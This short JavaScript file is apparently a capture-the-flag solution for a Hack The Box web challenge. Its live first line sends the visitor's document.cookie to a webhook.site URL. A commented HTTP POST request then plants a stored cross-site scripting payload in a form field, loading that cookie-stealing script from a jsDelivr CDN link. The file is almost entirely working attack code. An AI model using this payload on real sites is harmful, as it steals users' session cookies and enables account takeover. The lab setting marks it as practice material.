//Let's use a server to retrive the cookie session
fetch('https://webhook.site/3961e7ca-d164-4fc5-b6f9-d795f8f8f070?cookie=' + document.cookie);

//Example of the request to use
/*
POST /api/submit HTTP/1.1
Host: 206.189.122.191:32564
Content-Length: 195
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://206.189.122.191:32564
Referer: http://206.189.122.191:32564/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"halloween_name":"<script src=\"https://cdn.jsdelivr.net/gh/emanuelepicas/cursed-secret-party-HTB/cookie.js\"></script>","email":"test@hl.com","costume_type":"monster","trick_or_treat":"tricks"}
*/
